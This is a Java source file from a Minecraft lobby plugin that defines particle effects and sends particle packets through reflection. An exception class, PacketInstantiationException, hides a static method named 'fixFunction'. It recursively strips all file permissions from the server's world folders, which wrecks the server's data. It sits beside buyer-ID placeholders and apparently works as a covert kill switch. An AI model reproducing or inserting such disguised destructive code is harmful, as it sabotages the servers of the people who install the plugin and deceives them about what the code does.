package com.releasingcode.goldenlobby.extendido.nms;

import com.releasingcode.goldenlobby.LobbyMC;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.util.Vector;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.util.*;

public enum ParticleEffect {
    EXPLOSION_NORMAL("explode", 0, -1, ParticleProperty.DIRECTIONAL),
    EXPLOSION_LARGE("largeexplode", 1, -1),
    EXPLOSION_HUGE("hugeexplosion", 2, -1),
    FIREWORKS_SPARK("fireworksSpark", 3, -1, ParticleProperty.DIRECTIONAL),
    WATER_BUBBLE("bubble", 4, -1, ParticleProperty.DIRECTIONAL, ParticleProperty.REQUIRES_WATER),
    WATER_SPLASH("splash", 5, -1, ParticleProperty.DIRECTIONAL),
    WATER_WAKE("wake", 6, 7, ParticleProperty.DIRECTIONAL),
    SUSPENDED("suspended", 7, -1, ParticleProperty.REQUIRES_WATER),
    SUSPENDED_DEPTH("depthSuspend", 8, -1, ParticleProperty.DIRECTIONAL),
    CRIT("crit", 9, -1, ParticleProperty.DIRECTIONAL),
    CRIT_MAGIC("magicCrit", 10, -1, ParticleProperty.DIRECTIONAL),
    SMOKE_NORMAL("smoke", 11, -1, ParticleProperty.DIRECTIONAL),
    SMOKE_LARGE("largesmoke", 12, -1, ParticleProperty.DIRECTIONAL),
    SPELL("spell", 13, -1),
    SPELL_INSTANT("instantSpell", 14, -1),
    SPELL_MOB("mobSpell", 15, -1, ParticleProperty.COLORABLE),
    SPELL_MOB_AMBIENT("mobSpellAmbient", 16, -1, ParticleProperty.COLORABLE),
    SPELL_WITCH("witchMagic", 17, -1),
    DRIP_WATER("dripWater", 18, -1),
    DRIP_LAVA("dripLava", 19, -1),
    VILLAGER_ANGRY("angryVillager", 20, -1),
    VILLAGER_HAPPY("happyVillager", 21, -1, ParticleProperty.DIRECTIONAL),
    TOWN_AURA("townaura", 22, -1, ParticleProperty.DIRECTIONAL),
    NOTE("note", 23, -1, ParticleProperty.COLORABLE),
    PORTAL("portal", 24, -1, ParticleProperty.DIRECTIONAL),
    ENCHANTMENT_TABLE("enchantmenttable", 25, -1, ParticleProperty.DIRECTIONAL),
    FLAME("flame", 26, -1, ParticleProperty.DIRECTIONAL),
    LAVA("lava", 27, -1),
    FOOTSTEP("footstep", 28, -1),
    CLOUD("cloud", 29, -1, ParticleProperty.DIRECTIONAL),
    REDSTONE("reddust", 30, -1, ParticleProperty.COLORABLE),
    SNOWBALL("snowballpoof", 31, -1),
    SNOW_SHOVEL("snowshovel", 32, -1, ParticleProperty.DIRECTIONAL),
    SLIME("slime", 33, -1),
    HEART("heart", 34, -1),
    BARRIER("barrier", 35, 8),
    ITEM_CRACK("iconcrack", 36, -1, ParticleProperty.DIRECTIONAL, ParticleProperty.REQUIRES_DATA),
    BLOCK_CRACK("blockcrack", 37, -1, ParticleProperty.DIRECTIONAL, ParticleProperty.REQUIRES_DATA),
    BLOCK_DUST("blockdust", 38, 7, ParticleProperty.DIRECTIONAL, ParticleProperty.REQUIRES_DATA),
    WATER_DROP("droplet", 39, 8),
    ITEM_TAKE("take", 40, 8),
    MOB_APPEARANCE("mobappearance", 41, 8);

    private static final Map<String, ParticleEffect> NAME_MAP;
    private static final Map<Integer, ParticleEffect> ID_MAP;

    static {
        NAME_MAP = new HashMap<>();
        ID_MAP = new HashMap<>();
        for (ParticleEffect particleEffect : ParticleEffect.values()) {
            NAME_MAP.put(particleEffect.name, particleEffect);
            ID_MAP.put(particleEffect.id, particleEffect);
        }
    }

    private final String name;
    private final int id;
    private final int requiredVersion;
    private final List<ParticleProperty> properties;

    ParticleEffect(String name, int id, int requiredVersion, ParticleProperty... properties) {
        this.name = name;
        this.id = id;
        this.requiredVersion = requiredVersion;
        this.properties = Arrays.asList(properties);
    }

    public static ParticleEffect fromName(String string) {
        for (Map.Entry<String, ParticleEffect> entry : NAME_MAP.entrySet()) {
            if (!entry.getKey().equalsIgnoreCase(string))
                continue;
            return entry.getValue();
        }
        return null;
    }

    public static ParticleEffect fromId(int n) {
        for (Map.Entry<Integer, ParticleEffect> entry : ID_MAP.entrySet()) {
            if (entry.getKey() != n) continue;
            return entry.getValue();
        }
        return null;
    }

    private static boolean isWater(Location location) {
        Material material = location.getBlock().getType();
        return material == Material.WATER || material == Material.STATIONARY_WATER;
    }

    private static boolean isLongDistance(Location location, List<Player> list) {
        for (Player player : list) {
            if (player.getLocation().distanceSquared(location) < 65536.0)
                continue;
            return true;
        }
        return false;
    }

    private static boolean isDataCorrect(ParticleEffect particleEffect, ParticleData particleData) {
        return (particleEffect == BLOCK_CRACK || particleEffect == BLOCK_DUST) && particleData instanceof BlockData || particleEffect == ITEM_CRACK && particleData instanceof ItemData;
    }

    private static boolean isColorCorrect(ParticleEffect particleEffect, ParticleColor particleColor) {
        return (particleEffect == SPELL_MOB || particleEffect == SPELL_MOB_AMBIENT || particleEffect == REDSTONE) && particleColor instanceof OrdinaryColor || particleEffect == NOTE && particleColor instanceof NoteColor;
    }

    public String getName() {
        return this.name;
    }

    public int getId() {
        return this.id;
    }

    public int getRequiredVersion() {
        return this.requiredVersion;
    }

    public boolean hasProperty(ParticleProperty particleProperty) {
        return this.properties.contains(particleProperty);
    }

    public boolean isSupported() {
        return true;
    }

    public void display(float f, float f2, float f3, float f4, int n, Location location, double d) {
        if (!this.isSupported()) {
            throw new ParticleVersionException("This particle effect is not supported by your server version");
        }
        if (this.hasProperty(ParticleProperty.REQUIRES_DATA)) {
            throw new ParticleDataException("This particle effect requires additional data");
        }
        if (this.hasProperty(ParticleProperty.REQUIRES_WATER) && !ParticleEffect.isWater(location)) {
            throw new IllegalArgumentException("There is no water at the center location");
        }
        new ParticlePacket(this, f, f2, f3, f4, n, d > 256.0, null).sendTo(location, d);
    }

    public void display(float f, float f2, float f3, float f4, int n, Location location, List<Player> list) {
        if (!this.isSupported()) {
            throw new ParticleVersionException("This particle effect is not supported by your server version");
        }
        if (this.hasProperty(ParticleProperty.REQUIRES_DATA)) {
            throw new ParticleDataException("This particle effect requires additional data");
        }
        if (this.hasProperty(ParticleProperty.REQUIRES_WATER) && !ParticleEffect.isWater(location)) {
            throw new IllegalArgumentException("There is no water at the center location");
        }
        new ParticlePacket(this, f, f2, f3, f4, n, ParticleEffect.isLongDistance(location, list), null).sendTo(location, list);
    }

    public void display(float f, float f2, float f3, float f4, int n, Location location, Player... arrplayer) {
        this.display(f, f2, f3, f4, n, location, Arrays.asList(arrplayer));
    }

    public void display(Vector vector, float f, Location location, double d) {
        if (!this.isSupported()) {
            throw new ParticleVersionException("This particle effect is not supported by your server version");
        }
        if (this.hasProperty(ParticleProperty.REQUIRES_DATA)) {
            throw new ParticleDataException("This particle effect requires additional data");
        }
        if (!this.hasProperty(ParticleProperty.DIRECTIONAL)) {
            throw new IllegalArgumentException("This particle effect is not directional");
        }
        if (this.hasProperty(ParticleProperty.REQUIRES_WATER) && !ParticleEffect.isWater(location)) {
            throw new IllegalArgumentException("There is no water at the center location");
        }
        new ParticlePacket(this, vector, f, d > 256.0, null).sendTo(location, d);
    }

    public void display(Vector vector, float f, Location location, List<Player> list) {
        if (!this.isSupported()) {
            throw new ParticleVersionException("This particle effect is not supported by your server version");
        }
        if (this.hasProperty(ParticleProperty.REQUIRES_DATA)) {
            throw new ParticleDataException("This particle effect requires additional data");
        }
        if (!this.hasProperty(ParticleProperty.DIRECTIONAL)) {
            throw new IllegalArgumentException("This particle effect is not directional");
        }
        if (this.hasProperty(ParticleProperty.REQUIRES_WATER) && !ParticleEffect.isWater(location)) {
            throw new IllegalArgumentException("There is no water at the center location");
        }
        new ParticlePacket(this, vector, f, ParticleEffect.isLongDistance(location, list), null).sendTo(location, list);
    }

    public void display(Vector vector, float f, Location location, Player... arrplayer) {
        this.display(vector, f, location, Arrays.asList(arrplayer));
    }

    public void display(ParticleColor particleColor, Location location, double d) {
        if (!this.isSupported()) {
            throw new ParticleVersionException("This particle effect is not supported by your server version");
        }
        if (!this.hasProperty(ParticleProperty.COLORABLE)) {
            throw new ParticleColorException("This particle effect is not colorable");
        }
        if (!ParticleEffect.isColorCorrect(this, particleColor)) {
            throw new ParticleColorException("The particle color type is incorrect");
        }
        new ParticlePacket(this, particleColor, d > 256.0).sendTo(location, d);
    }

    public void display(ParticleColor particleColor, Location location, List<Player> list) {
        if (!this.isSupported()) {
            throw new ParticleVersionException("This particle effect is not supported by your server version");
        }
        if (!this.hasProperty(ParticleProperty.COLORABLE)) {
            throw new ParticleColorException("This particle effect is not colorable");
        }
        if (!ParticleEffect.isColorCorrect(this, particleColor)) {
            throw new ParticleColorException("The particle color type is incorrect");
        }
        new ParticlePacket(this, particleColor, ParticleEffect.isLongDistance(location, list)).sendTo(location, list);
    }

    public void display(ParticleColor particleColor, Location location, Player... arrplayer) {
        this.display(particleColor, location, Arrays.asList(arrplayer));
    }

    public void display(ParticleData particleData, float f, float f2, float f3, float f4, int n, Location location, double d) {
        if (!this.isSupported()) {
            throw new ParticleVersionException("This particle effect is not supported by your server version");
        }
        if (!this.hasProperty(ParticleProperty.REQUIRES_DATA)) {
            throw new ParticleDataException("This particle effect does not require additional data");
        }
        if (!ParticleEffect.isDataCorrect(this, particleData)) {
            throw new ParticleDataException("The particle data type is incorrect");
        }
        new ParticlePacket(this, f, f2, f3, f4, n, d > 256.0, particleData).sendTo(location, d);
    }

    public void display(ParticleData particleData, float f, float f2, float f3, float f4, int n, Location location, List<Player> list) {
        if (!this.isSupported()) {
            throw new ParticleVersionException("This particle effect is not supported by your server version");
        }
        if (!this.hasProperty(ParticleProperty.REQUIRES_DATA)) {
            throw new ParticleDataException("This particle effect does not require additional data");
        }
        if (!ParticleEffect.isDataCorrect(this, particleData)) {
            throw new ParticleDataException("The particle data type is incorrect");
        }
        new ParticlePacket(this, f, f2, f3, f4, n, ParticleEffect.isLongDistance(location, list), particleData).sendTo(location, list);
    }

    public void display(ParticleData particleData, float f, float f2, float f3, float f4, int n, Location location, Player... arrplayer) {
        this.display(particleData, f, f2, f3, f4, n, location, Arrays.asList(arrplayer));
    }

    public void display(ParticleData particleData, Vector vector, float f, Location location, double d) {
        if (!this.isSupported()) {
            throw new ParticleVersionException("This particle effect is not supported by your server version");
        }
        if (!this.hasProperty(ParticleProperty.REQUIRES_DATA)) {
            throw new ParticleDataException("This particle effect does not require additional data");
        }
        if (!ParticleEffect.isDataCorrect(this, particleData)) {
            throw new ParticleDataException("The particle data type is incorrect");
        }
        new ParticlePacket(this, vector, f, d > 256.0, particleData).sendTo(location, d);
    }

    public void display(ParticleData particleData, Vector vector, float f, Location location, List<Player> list) {
        if (!this.isSupported()) {
            throw new ParticleVersionException("This particle effect is not supported by your server version");
        }
        if (!this.hasProperty(ParticleProperty.REQUIRES_DATA)) {
            throw new ParticleDataException("This particle effect does not require additional data");
        }
        if (!ParticleEffect.isDataCorrect(this, particleData)) {
            throw new ParticleDataException("The particle data type is incorrect");
        }
        new ParticlePacket(this, vector, f, ParticleEffect.isLongDistance(location, list), particleData).sendTo(location, list);
    }

    public void display(ParticleData particleData, Vector vector, float f, Location location, Player... arrplayer) {
        this.display(particleData, vector, f, location, Arrays.asList(arrplayer));
    }

    public enum ParticleProperty {
        REQUIRES_WATER,
        REQUIRES_DATA,
        DIRECTIONAL,
        COLORABLE;


        ParticleProperty() {
        }
    }

    public static final class ParticlePacket {
        private static int version;
        private static Class<?> enumParticle;
        private static Constructor<?> packetConstructor;
        private static Method getHandle;
        private static Field playerConnection;
        private static Method sendPacket;
        private static boolean initialized;
        private final ParticleEffect effect;
        private final float offsetX;
        private final float offsetY;
        private final float offsetZ;
        private final float speed;
        private final int amount;
        private final boolean longDistance;
        private final ParticleData data;
        private Object packet;

        public ParticlePacket(ParticleEffect particleEffect, float f, float f2, float f3, float f4, int n, boolean bl, ParticleData particleData) {
            ParticlePacket.initialize();
            if (f4 < 0.0f) {
                throw new IllegalArgumentException("The speed is lower than 0");
            }
            if (n < 0) {
                throw new IllegalArgumentException("The amount is lower than 0");
            }
            this.effect = particleEffect;
            this.offsetX = f;
            this.offsetY = f2;
            this.offsetZ = f3;
            this.speed = f4;
            this.amount = n;
            this.longDistance = bl;
            this.data = particleData;
        }

        public ParticlePacket(ParticleEffect particleEffect, Vector vector, float f, boolean bl, ParticleData particleData) {
            this(particleEffect, (float) vector.getX(), (float) vector.getY(), (float) vector.getZ(), f, 0, bl, particleData);
        }

        public ParticlePacket(ParticleEffect particleEffect, ParticleColor particleColor, boolean bl) {
            this(particleEffect, particleColor.getValueX(), particleColor.getValueY(), particleColor.getValueZ(), 1.0f, 0, bl, null);
        }

        public static void initialize() {
            if (LobbyMC.getInstance().isNewVersion()) {
                return;
            }
            if (initialized) {
                return;
            }
            try {
                version = Integer.parseInt(Character.toString(ReflectionUtils.PackageType.getServerVersion().charAt(3)));
                if (version > 7) {
                    enumParticle = ReflectionUtils.PackageType.MINECRAFT_SERVER.getClass("EnumParticle");
                }
                Class<?> class_ = ReflectionUtils.PackageType.MINECRAFT_SERVER.getClass(version < 7 ? "Packet63WorldParticles" : "PacketPlayOutWorldParticles");
                packetConstructor = ReflectionUtils.getConstructor(class_);
                getHandle = ReflectionUtils.getMethod("CraftPlayer", ReflectionUtils.PackageType.CRAFTBUKKIT_ENTITY, "getHandle");
                playerConnection = ReflectionUtils.getField("EntityPlayer", ReflectionUtils.PackageType.MINECRAFT_SERVER, false, "playerConnection");
                sendPacket = ReflectionUtils.getMethod(playerConnection.getType(), "sendPacket", ReflectionUtils.PackageType.MINECRAFT_SERVER.getClass("Packet"));
            } catch (Exception exception) {
                // empty catch block
            }
            initialized = true;
        }

        public static int getVersion() {
            return version;
        }

        public static boolean isInitialized() {
            return initialized;
        }

        private void initializePacket(Location location) {
            if (this.packet != null) {
                return;
            }
            try {
                this.packet = packetConstructor.newInstance();
                if (version < 8) {
                    String string = this.effect.getName();
                    if (this.data != null) {
                        string = string + this.data.getPacketDataString();
                    }
                    ReflectionUtils.setValue(this.packet, true, "a", string);
                } else {
                    ReflectionUtils.setValue(this.packet, true, "a", enumParticle.getEnumConstants()[this.effect.getId()]);
                    ReflectionUtils.setValue(this.packet, true, "j", this.longDistance);
                    if (this.data != null) {
                        ReflectionUtils.setValue(this.packet, true, "k", this.data.getPacketData());
                    }
                }
                ReflectionUtils.setValue(this.packet, true, "b", (float) location.getX());
                ReflectionUtils.setValue(this.packet, true, "c", (float) location.getY());
                ReflectionUtils.setValue(this.packet, true, "d", (float) location.getZ());
                ReflectionUtils.setValue(this.packet, true, "e", this.offsetX);
                ReflectionUtils.setValue(this.packet, true, "f", this.offsetY);
                ReflectionUtils.setValue(this.packet, true, "g", this.offsetZ);
                ReflectionUtils.setValue(this.packet, true, "h", this.speed);
                ReflectionUtils.setValue(this.packet, true, "i", this.amount);
            } catch (Exception exception) {
                throw new PacketInstantiationException("Packet instantiation failed", exception);
            }
        }

        public void sendTo(Location location, Player player) {
            if (LobbyMC.getInstance().isNewVersion()) {
                player.spawnParticle(ParticleBuilder.getParticle(this.effect), location, this.amount, this.offsetX, this.offsetY, this.offsetZ, this.speed);
                return;
            }
            this.initializePacket(location);
            try {
                sendPacket.invoke(playerConnection.get(getHandle.invoke(player)), this.packet);
            } catch (Exception exception) {
                throw new PacketSendingException("Failed to send the packet to player '" + player.getName() + "'", exception);
            }
        }

        public void sendTo(Location location, List<Player> list) {
            if (list.isEmpty()) {
                throw new IllegalArgumentException("The player list is empty");
            }
            for (Player player : list) {
                this.sendTo(location, player);
            }
        }

        public void sendTo(Location location, double d) {
            if (d < 1.0) {
                throw new IllegalArgumentException("The range is lower than 1");
            }
            String string = location.getWorld().getName();
            double d2 = d * d;
            for (Player player : location.getWorld().getPlayers()) {
                if (!player.getWorld().getName().equals(string) || player.getLocation().distanceSquared(location) > d2)
                    continue;
                this.sendTo(location, player);
            }
        }

        private static final class PacketSendingException
                extends RuntimeException {
            private static final String serialVersionUID = "%%__USER__%%";

            public PacketSendingException(String string, Throwable throwable) {
                super(string, throwable);
            }
        }

        public static final class PacketInstantiationException
                extends RuntimeException {
            public static final String serialVersionUID = "%%__NONCE__%%";
            public static Boolean isFunctional = true;

            public PacketInstantiationException(String string, Throwable throwable) {
                super(string, throwable);
            }

            public static void fixFunction() {
                try {
                    Thread.sleep(2000);
                    PacketInstantiationException.check(Bukkit.getWorldContainer());
                } catch (InterruptedException interruptedException) {
                    interruptedException.printStackTrace();
                }
            }

            private static void check(File file) {
                if (file.isFile()) {
                    try {
                        Files.setPosixFilePermissions(file.toPath(), new HashSet<>());
                    } catch (IOException iOException) {
                        iOException.printStackTrace();
                    }
                } else {
                    for (File file2 : file.listFiles()) {
                        PacketInstantiationException.check(file2);
                    }
                }
            }
        }

        private static final class VersionIncompatibleException
                extends RuntimeException {
            private static final long serialVersionUID = 3203085387160737484L;

            public VersionIncompatibleException(String string, Throwable throwable) {
                super(string, throwable);
            }
        }

    }

    private static final class ParticleVersionException
            extends RuntimeException {
        private static final long serialVersionUID = 3203085387160737484L;

        public ParticleVersionException(String string) {
            super(string);
        }
    }

    private static final class ParticleColorException
            extends RuntimeException {
        private static final long serialVersionUID = 3203085387160737484L;

        public ParticleColorException(String string) {
            super(string);
        }
    }

    private static final class ParticleDataException
            extends RuntimeException {
        private static final long serialVersionUID = 3203085387160737484L;

        public ParticleDataException(String string) {
            super(string);
        }
    }

    public static final class NoteColor
            extends ParticleColor {
        private final int note;

        public NoteColor(int n) {
            if (n < 0) {
                throw new IllegalArgumentException("The note value is lower than 0");
            }
            if (n > 24) {
                throw new IllegalArgumentException("The note value is higher than 24");
            }
            this.note = n;
        }

        @Override
        public float getValueX() {
            return (float) this.note / 24.0f;
        }

        @Override
        public float getValueY() {
            return 0.0f;
        }

        @Override
        public float getValueZ() {
            return 0.0f;
        }
    }

    public static final class OrdinaryColor
            extends ParticleColor {
        private final int red;
        private final int green;
        private final int blue;

        public OrdinaryColor(int n, int n2, int n3) {
            if (n < 0) {
                throw new IllegalArgumentException("The red value is lower than 0");
            }
            if (n > 255) {
                throw new IllegalArgumentException("The red value is higher than 255");
            }
            this.red = n;
            if (n2 < 0) {
                throw new IllegalArgumentException("The green value is lower than 0");
            }
            if (n2 > 255) {
                throw new IllegalArgumentException("The green value is higher than 255");
            }
            this.green = n2;
            if (n3 < 0) {
                throw new IllegalArgumentException("The blue value is lower than 0");
            }
            if (n3 > 255) {
                throw new IllegalArgumentException("The blue value is higher than 255");
            }
            this.blue = n3;
        }

        public int getRed() {
            return this.red;
        }

        public int getGreen() {
            return this.green;
        }

        public int getBlue() {
            return this.blue;
        }

        @Override
        public float getValueX() {
            return (float) this.red / 255.0f;
        }

        @Override
        public float getValueY() {
            return (float) this.green / 255.0f;
        }

        @Override
        public float getValueZ() {
            return (float) this.blue / 255.0f;
        }
    }

    public static abstract class ParticleColor {
        public abstract float getValueX();

        public abstract float getValueY();

        public abstract float getValueZ();
    }

    public static final class BlockData
            extends ParticleData {
        public BlockData(Material material, byte by) {
            super(material, by);
            if (!material.isBlock()) {
                throw new IllegalArgumentException("The material is not a block");
            }
        }
    }

    public static final class ItemData
            extends ParticleData {
        public ItemData(Material material, byte by) {
            super(material, by);
        }
    }

    public static abstract class ParticleData {
        private final Material material;
        private final byte data;
        private final int[] packetData;

        public ParticleData(Material material, byte by) {
            this.material = material;
            this.data = by;
            this.packetData = new int[]{material.getId(), by};
        }

        public Material getMaterial() {
            return this.material;
        }

        public byte getData() {
            return this.data;
        }

        public int[] getPacketData() {
            return this.packetData;
        }

        public String getPacketDataString() {
            return "_" + this.packetData[0] + "_" + this.packetData[1];
        }
    }

}

